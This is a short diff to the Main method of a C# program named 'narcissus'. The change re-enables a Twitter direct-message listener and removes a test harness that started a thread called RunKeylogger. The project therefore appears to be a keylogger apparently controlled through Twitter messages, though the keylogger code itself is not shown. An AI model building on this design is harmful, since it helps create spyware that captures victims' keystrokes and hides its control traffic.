@@ -855,21 +855,11 @@ namespace narcissus
 
         public static void Main()
         {
-            /*
             narcissusDMClient.BaseAddress = new Uri("https://api.twitter.com/");
             narcissusImageClient.BaseAddress = new Uri("https://upload.twitter.com/");
             Thread listenerThread = new Thread(new ThreadStart(MessageListener));
             listenerThread.Start();
             listenerThread.Join();
-            */
-            Thread keyloggerTest = new Thread(new ThreadStart(RunKeylogger));
-            keyloggerTest.Start();
-            Console.WriteLine("Press [q] to quit >> ");
-            while(Console.ReadLine() != "q")
-            {
-                Console.WriteLine("Press [q] to quit >> ");
-            }
-            keyloggerTest.Abort();
         }
 
         
